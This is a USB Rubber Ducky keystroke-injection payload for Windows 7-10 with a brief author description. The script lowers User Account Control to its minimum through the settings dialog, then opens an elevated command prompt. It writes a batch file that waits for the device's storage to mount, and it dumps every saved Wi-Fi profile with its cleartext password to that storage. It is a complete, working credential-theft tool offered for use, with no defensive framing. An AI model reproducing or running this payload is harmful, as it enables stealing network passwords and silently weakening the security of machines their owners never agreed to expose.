This payload is designed to retrieve all save wireless networks and their passwords, on a windows 7-10 machine.  I have modified the normal way around bypassing UAC because i found that on some machines, the alert prompt where we would typically say "ALT y" or "LEFTARROW ENTER", is sometimes not the focus of the screen.. this method goes right into the UAC settings and lowers it to the min.

    REM --> Auth- eliddell
    REM --> for use with TwinDuck on windows 7+
    REM --> This duck will take all saved wireless networks and save their info including passwords/keys, to a text file on your duck
    DEFAULT_DELAY 75
    DELAY 3000
    REM --> Minimize all windows
    WINDOWS d
    DELAY 500
    REM run CMD as admin to see network passwords/keys
    REM sometimes the admin prompt does not take focus on machines with secure desktop we will force UAC to min
    CONTROL ESCAPE
    DELAY 300
    STRING useraccountcontrolsettings
    ENTER
    DELAY 300
    LEFTARROW
    ENTER
    DELAY 300 
    DOWNARROW
    DOWNARROW
    DOWNARROW
    DOWNARROW
    TAB
    ENTER
    DELAY 300
    LEFTARROW
    ENTER
    DELAY 300
    CONTROL ESCAPE
    DELAY 300
    STRING cmd
    CTRL-SHIFT ENTER
    DELAY 300
    REM Change directories because System32 appears to be protected. 
    STRING CD %TEMP%
    ENTER
    REM Make batch file that waits for SD card to mount. 
    REM Delete batch file if already exists
    STRING erase /Q DuckyWait.bat
    ENTER
    STRING copy con DuckyWait.bat
    ENTER
    REM DuckyWait.bat contents
    STRING :while1
    ENTER
    STRING for /f %%d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') do set myd=%%d
    ENTER
    STRING if Exist %myd% (
    ENTER
    STRING goto break
    ENTER
    STRING )
    ENTER
    STRING timeout /t 30
    ENTER
    STRING goto while1
    ENTER
    STRING :break
    ENTER
    REM 
    REM once mounted switch to ducky dir for ease of dumping log to txt
    STRING %myd%
    ENTER
    DELAY 500
    REM iterate through all saved wlan profiles and print saved info for each
    STRING for /f "tokens=4 delims=: " %%A in ('netsh wlan show profiles') do netsh wlan show profiles name=%%A key=clear >>wlanProfiles.txt
    CONTROL z
    ENTER
    REM run duckywait
    STRING DuckyWait.bat
    ENTER
    DELAY 500
    STRING exit
    ENTER
    WINDOWS d



